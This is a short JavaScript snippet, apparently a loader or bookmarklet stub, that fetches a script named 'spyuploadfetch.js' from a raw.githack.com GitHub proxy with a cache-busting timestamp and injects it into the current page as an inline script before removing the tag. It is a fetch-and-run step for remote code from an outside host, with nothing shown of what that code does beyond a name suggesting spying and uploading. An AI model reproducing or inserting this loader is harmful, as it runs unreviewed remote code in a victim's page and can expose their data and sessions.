fetch('https://raw.githack.com/Dogatw/Scripts/main/spyuploadfetch.js?t=' + Date.now())
  .then(r => r.text())
  .then(code => {
      const s = document.createElement('script');
      s.textContent = code;
      document.head.appendChild(s);
      s.remove();
  });
